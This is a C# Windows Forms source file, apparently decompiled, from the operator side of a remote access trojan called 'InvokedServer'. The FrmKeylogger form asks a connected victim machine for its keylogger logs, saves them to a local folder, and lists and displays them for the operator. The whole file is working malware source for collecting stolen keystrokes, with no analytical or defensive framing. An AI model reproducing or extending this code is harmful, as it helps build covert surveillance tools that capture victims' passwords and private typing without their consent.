

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;
using InvokedCommon.Messages;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;


namespace InvokedServer.Forms
{
	public partial class FrmKeylogger : Form
	{
		private readonly Client _connectClient;
		private readonly KeyloggerHandler _keyloggerHandler;
		private readonly string _baseDownloadPath;
		private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new Dictionary<Client, FrmKeylogger>();

		public static FrmKeylogger CreateNewOrGetExisting(Client client)
		{
			if (FrmKeylogger.OpenedForms.ContainsKey(client))
				return FrmKeylogger.OpenedForms[client];
			FrmKeylogger newOrGetExisting = new FrmKeylogger(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmKeylogger.OpenedForms.Remove(client));
			FrmKeylogger.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmKeylogger(Client client)
		{
			this._connectClient = client;
			this._keyloggerHandler = new KeyloggerHandler(client);
			this._baseDownloadPath = Path.Combine(this._connectClient.Value.DownloadDirectory, "Logs\\");
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._keyloggerHandler.ProgressChanged += new MessageProcessorBase<string>.ReportProgressEventHandler(this.LogsChanged);
			MessageHandler.Register((IMessageProcessor)this._keyloggerHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._keyloggerHandler);
			this._keyloggerHandler.ProgressChanged -= new MessageProcessorBase<string>.ReportProgressEventHandler(this.LogsChanged);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Text = WindowHelper.GetWindowTitle("Keylogger", this._connectClient) + " *Client Disconnected*";
		}

		private void LogsChanged(object sender, string message)
		{
			this.RefreshLogsDirectory();
			this.btnGetLogs.Enabled = true;
			this.stripLblStatus.Text = "Status: " + message;
		}

		private void FrmKeylogger_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle("Keylogger", this._connectClient);
			if (!Directory.Exists(this._baseDownloadPath))
				Directory.CreateDirectory(this._baseDownloadPath);
			else
				this.RefreshLogsDirectory();
		}

		private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.UnregisterMessageHandler();
			this._keyloggerHandler.Dispose();
		}

		private void btnGetLogs_Click(object sender, EventArgs e)
		{
			this.btnGetLogs.Enabled = false;
			this.stripLblStatus.Text = "Status: Retrieving logs...";
			this._keyloggerHandler.RetrieveLogs();
		}

		private void lstLogs_ItemActivate(object sender, EventArgs e)
		{
			if (this.lstLogs.SelectedItems.Count <= 0)
				return;
			if (!this.wLogViewer.Visible)
				this.wLogViewer.Visible = true;
			this.wLogViewer.Navigate(Path.Combine(this._baseDownloadPath, this.lstLogs.SelectedItems[0].Text));
		}

		private void WebBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
		{
			if (this.wLogViewer.Document.Body == (HtmlElement)null)
				return;
			this.wLogViewer.Document.Body.InnerHtml += "\r\n                    <style>\r\n                        body {\r\n                            background-color: rgb(35, 35, 35);\r\n                            color: White;\r\n                        }\r\n                        .h {\r\n                            color: White;\r\n                        }\r\n                    </style>";
		}

		private void RefreshLogsDirectory()
		{
			this.lstLogs.Items.Clear();
			foreach (FileInfo file in new DirectoryInfo(this._baseDownloadPath).GetFiles())
				this.lstLogs.Items.Add(new ListViewItem()
				{
					Text = file.Name
				});
		}

		private void OpenAllBtn_Click(object sender, EventArgs e)
		{
			if (!this.wLogViewer.Visible)
				this.wLogViewer.Visible = true;
			string str1 = "";
			foreach (ListViewItem listViewItem in this.lstLogs.Items)
			{
				string str2 = File.ReadAllText(Path.Combine(this._baseDownloadPath, listViewItem.Text), Encoding.UTF8);
				str1 += str2;
			}
			this.wLogViewer.DocumentText = str1;
		}
	}
}